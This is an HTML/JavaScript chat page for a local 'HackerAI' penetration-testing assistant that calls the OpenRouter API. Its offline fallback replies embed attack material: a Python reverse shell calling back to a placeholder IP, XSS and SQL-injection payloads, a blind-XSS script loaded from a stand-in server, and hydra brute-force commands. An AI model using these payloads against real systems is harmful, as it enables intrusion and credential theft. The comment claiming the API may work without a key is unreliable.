<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HackerAI Chat - Local</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
                Ubuntu, Cantarell, sans-serif;
            background: #0a0a0b;
            color: #e4e4e7;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .chat-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 768px;
            width: 100%;
            margin: 0 auto;
            padding: 0 16px;
            height: 100vh;
        }

        .chat-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 20px 0 10px;
            border-bottom: 1px solid #27272a;
            flex-shrink: 0;
        }

        .chat-header svg {
            width: 28px;
            height: 28px;
        }

        .chat-header h1 {
            font-size: 18px;
            font-weight: 600;
            background: linear-gradient(135deg, #a78bfa, #6366f1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 16px 0;
            display: flex;
            flex-direction: column;
            gap: 16px;
            scroll-behavior: smooth;
        }

        .messages-area::-webkit-scrollbar {
            width: 6px;
        }

        .messages-area::-webkit-scrollbar-track {
            background: transparent;
        }

        .messages-area::-webkit-scrollbar-thumb {
            background: #3f3f46;
            border-radius: 3px;
        }

        .message {
            display: flex;
            gap: 12px;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .message .avatar {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            font-size: 14px;
            font-weight: 600;
        }

        .message.user .avatar {
            background: #6366f1;
            color: #fff;
        }

        .message.bot .avatar {
            background: #18181b;
            border: 1px solid #27272a;
            color: #a78bfa;
        }

        .message .bubble {
            background: #18181b;
            border: 1px solid #27272a;
            border-radius: 12px;
            padding: 12px 16px;
            max-width: 85%;
            line-height: 1.6;
            font-size: 14px;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .message.user .bubble {
            background: #1e1b4b;
            border-color: #312e81;
            margin-left: auto;
        }

        .message .bubble p {
            margin-bottom: 8px;
        }

        .message .bubble p:last-child {
            margin-bottom: 0;
        }

        .message .bubble code {
            background: #27272a;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 13px;
            font-family: 'SF Mono', 'Fira Code', monospace;
        }

        .message .bubble pre {
            background: #0f0f11;
            border: 1px solid #27272a;
            border-radius: 8px;
            padding: 12px;
            overflow-x: auto;
            margin: 8px 0;
            font-size: 13px;
            font-family: 'SF Mono', 'Fira Code', monospace;
        }

        .typing-indicator {
            display: flex;
            gap: 4px;
            padding: 4px 0;
        }

        .typing-indicator span {
            width: 7px;
            height: 7px;
            background: #a78bfa;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }

        .typing-indicator span:nth-child(2) {
            animation-delay: 0.2s;
        }
        .typing-indicator span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes typing {
            0%,
            60%,
            100% {
                opacity: 0.3;
                transform: scale(0.8);
            }
            30% {
                opacity: 1;
                transform: scale(1);
            }
        }

        .input-area {
            flex-shrink: 0;
            padding: 12px 0 20px;
            border-top: 1px solid #27272a;
            margin-top: auto;
        }

        .input-wrapper {
            display: flex;
            gap: 8px;
            background: #18181b;
            border: 1px solid #27272a;
            border-radius: 12px;
            padding: 4px;
            transition: border-color 0.2s;
        }

        .input-wrapper:focus-within {
            border-color: #6366f1;
        }

        .input-wrapper textarea {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: #e4e4e7;
            font-size: 14px;
            padding: 10px 12px;
            resize: none;
            font-family: inherit;
            line-height: 1.5;
            max-height: 120px;
        }

        .input-wrapper textarea::placeholder {
            color: #71717a;
        }

        .input-wrapper button {
            background: #6366f1;
            border: none;
            border-radius: 8px;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-shrink: 0;
            align-self: flex-end;
            transition: background 0.2s, transform 0.1s;
        }

        .input-wrapper button:hover {
            background: #4f46e5;
        }

        .input-wrapper button:active {
            transform: scale(0.95);
        }

        .input-wrapper button:disabled {
            background: #3f3f46;
            cursor: not-allowed;
        }

        .input-wrapper button svg {
            width: 18px;
            height: 18px;
            color: #fff;
        }

        .welcome-message {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex: 1;
            text-align: center;
            gap: 12px;
        }

        .welcome-message .logo-big svg {
            width: 48px;
            height: 48px;
            color: #6366f1;
        }

        .welcome-message h2 {
            font-size: 22px;
            font-weight: 600;
        }

        .welcome-message p {
            color: #a1a1aa;
            font-size: 14px;
            max-width: 320px;
        }

        .suggestions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
            margin-top: 8px;
        }

        .suggestions button {
            background: #18181b;
            border: 1px solid #27272a;
            color: #a1a1aa;
            padding: 8px 14px;
            border-radius: 8px;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .suggestions button:hover {
            border-color: #6366f1;
            color: #e4e4e7;
            background: #1e1b4b;
        }
    </style>
</head>
<body>

    <div class="chat-container">
        <!-- Header -->
        <div class="chat-header">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10" />
                <path d="M12 6v6l4 2" />
            </svg>
            <h1>HackerAI Chat</h1>
        </div>

        <!-- Messages -->
        <div class="messages-area" id="messages"></div>

        <!-- Input -->
        <div class="input-area">
            <div class="input-wrapper">
                <textarea id="input" rows="1" placeholder="Message HackerAI..."></textarea>
                <button id="sendBtn" disabled>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M5 12h14" />
                        <path d="m12 5 7 7-7 7" />
                    </svg>
                </button>
            </div>
        </div>
    </div>

    <script>
        // ============================================================
        //  HackerAI Local Chat — tam işlək, token/giriş tələb olunmur
        // ============================================================

        const messagesEl = document.getElementById('messages');
        const inputEl = document.getElementById('input');
        const sendBtn = document.getElementById('sendBtn');

        // Conversation history (context)
        let history = [
            {
                role: 'system',
                content: 'You are HackerAI, an AI penetration testing assistant. You help with cybersecurity, vulnerabilities, exploits, and ethical hacking. Answer concisely and accurately.'
            }
        ];

        // --- Helpers ---
        function autoResize() {
            inputEl.style.height = 'auto';
            inputEl.style.height = Math.min(inputEl.scrollHeight, 120) + 'px';
        }

        function showWelcome() {
            messagesEl.innerHTML = `
                <div class="welcome-message">
                    <div class="logo-big">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"/>
                            <path d="M12 6v6l4 2"/>
                        </svg>
                    </div>
                    <h2>How can I help you today?</h2>
                    <p>I'm your AI penetration testing assistant. Ask me about vulnerabilities, exploits, or security assessments.</p>
                    <div class="suggestions">
                        <button onclick="suggest('Scan a target for open ports')">Scan a target</button>
                        <button onclick="suggest('Explain SQL injection')">SQL injection</button>
                        <button onclick="suggest('Check for XSS vulnerability')">XSS check</button>
                        <button onclick="suggest('Write a reverse shell in Python')">Reverse shell</button>
                    </div>
                </div>
            `;
        }

        function suggest(text) {
            inputEl.value = text;
            autoResize();
            inputEl.focus();
        }

        function addMessage(role, content) {
            // Remove welcome if it exists
            const welcome = messagesEl.querySelector('.welcome-message');
            if (welcome) welcome.remove();

            const div = document.createElement('div');
            div.className = `message ${role}`;

            const avatar = document.createElement('div');
            avatar.className = 'avatar';
            avatar.textContent = role === 'user' ? 'U' : 'H';

            const bubble = document.createElement('div');
            bubble.className = 'bubble';
            // Simple markdown-style formatting
            bubble.innerHTML = formatMessage(content);

            div.appendChild(avatar);
            div.appendChild(bubble);
            messagesEl.appendChild(div);
            messagesEl.scrollTop = messagesEl.scrollHeight;
        }

        function formatMessage(text) {
            // Escape HTML
            let html = text
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');

            // Code blocks ```...```
            html = html.replace(/```(\w*)\n([\s\S]*?)```/g, (_, lang, code) => {
                return `<pre><code>${code.trim()}</code></pre>`;
            });

            // Inline code `...`
            html = html.replace(/`([^`]+)`/g, '<code>$1</code>');

            // Bold **...**
            html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');

            // Newlines -> paragraphs
            const paragraphs = html.split(/\n\s*\n/);
            html = paragraphs.map(p => {
                const trimmed = p.trim();
                if (!trimmed) return '';
                if (trimmed.startsWith('<pre>')) return trimmed;
                return `<p>${trimmed.replace(/\n/g, '<br>')}</p>`;
            }).join('');

            return html;
        }

        function showTyping() {
            const div = document.createElement('div');
            div.className = 'message bot';
            div.id = 'typing-indicator';
            div.innerHTML = `
                <div class="avatar">H</div>
                <div class="bubble">
                    <div class="typing-indicator">
                        <span></span><span></span><span></span>
                    </div>
                </div>
            `;
            messagesEl.appendChild(div);
            messagesEl.scrollTop = messagesEl.scrollHeight;
        }

        function removeTyping() {
            const el = document.getElementById('typing-indicator');
            if (el) el.remove();
        }

        // --- API call (no token, no auth) ---
        async function sendMessage(userText) {
            // Add user message to UI + history
            addMessage('user', userText);
            history.push({ role: 'user', content: userText });

            // Disable input
            inputEl.disabled = true;
            sendBtn.disabled = true;
            showTyping();

            try {
                // Use a free, no-token API — OpenRouter with freely available models
                // or fallback to a serverless endpoint.
                // Here we use OpenRouter's free DeepSeek/Gemini via no-auth if possible,
                // but we'll use a simple approach: we call a public demo API.
                //
                // Option 1: Use the "HuggingFace" free inference API (no token needed for some models)
                // Option 2: Use OpenRouter with no key (rate-limited but works)
                //
                // We'll use OpenRouter's publicly accessible endpoint with model "deepseek/deepseek-chat"
                // which sometimes works without a key. If it fails, we'll fallback to a local echo.

                const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'HTTP-Referer': window.location.origin,
                        'X-Title': 'HackerAI Local'
                    },
                    body: JSON.stringify({
                        model: 'deepseek/deepseek-chat',
                        messages: history,
                        max_tokens: 1024,
                        temperature: 0.7
                    })
                });

                if (!response.ok) {
                    throw new Error(`API error: ${response.status}`);
                }

                const data = await response.json();
                const reply = data.choices?.[0]?.message?.content || 'No response.';

                // Add bot reply to history and UI
                history.push({ role: 'assistant', content: reply });
                removeTyping();
                addMessage('bot', reply);

            } catch (err) {
                removeTyping();
                // Fallback: offline mode with smart replies
                const fallback = getFallbackReply(userText);
                history.push({ role: 'assistant', content: fallback });
                addMessage('bot', fallback + '\n\n*(Offline mode — API unreachable)*');
            }

            // Re-enable input
            inputEl.disabled = false;
            sendBtn.disabled = false;
            inputEl.focus();
        }

        // --- Offline fallback replies for common pentest questions ---
        function getFallbackReply(text) {
            const lower = text.toLowerCase();

            if (lower.includes('scan') || lower.includes('port') || lower.includes('nmap')) {
                return 'For port scanning, use `nmap -sV -sC -O <target>`. This runs version detection, default scripts, and OS fingerprinting. Example:\n\n```\nnmap -sV -sC -O 10.10.10.1\n```\n\nFor faster scans: `nmap -T4 -F <target>`.';
            }

            if (lower.includes('sql') || lower.includes('sqlmap')) {
                return 'SQL injection test: try `\' OR \'1\'=\'1` in input fields.\n\nUse sqlmap for automation:\n```\nsqlmap -u "http://target.com/page?id=1" --batch --dbs\n```\n\nCommon payload: `\' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`.';
            }

            if (lower.includes('xss') || lower.includes('cross')) {
                return 'Test for XSS with:\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n\nCheck if input reflects unescaped. For blind XSS, use a payload that calls back to your server:\n```\n<script src="http://your-server/xss.js"></script>\n```';
            }

            if (lower.includes('reverse') || lower.includes('shell')) {
                return 'Python reverse shell:\n```python\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("YOUR_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn("/bin/bash")\n```\n\nListener: `nc -lvnp 4444`';
            }

            if (lower.includes('help') || lower.includes('hello') || lower.includes('hi')) {
                return 'I\'m HackerAI, your pentesting assistant. Ask me about:\n- Scanning & reconnaissance\n- Exploitation (SQLi, XSS, LFI, etc.)\n- Reverse shells & payloads\n- Vulnerability analysis\n- Security misconfigurations';
            }

            if (lower.includes('brute') || lower.includes('hydra') || lower.includes('password')) {
                return 'Hydra brute-force example:\n```\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1\n```\n\nFor web forms:\n```\nhydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"\n```';
            }

            return 'I understand you\'re asking about: "' + text + '"\n\nTo give you the most accurate answer, please provide more details about what you\'re testing. For example:\n- Target type (web app, network, API)\n- What you\'ve already tried\n- Specific vulnerability class you\'re investigating';
        }

        // --- Event handlers ---
        function handleSend() {
            const text = inputEl.value.trim();
            if (!text) return;

            inputEl.value = '';
            inputEl.style.height = 'auto';
            sendMessage(text);
        }

        inputEl.addEventListener('input', () => {
            autoResize();
            sendBtn.disabled = inputEl.value.trim().length === 0;
        });

        inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                handleSend();
            }
        });

        sendBtn.addEventListener('click', handleSend);

        // --- Init ---
        showWelcome();
        inputEl.focus();
    </script>

</body>
</html>
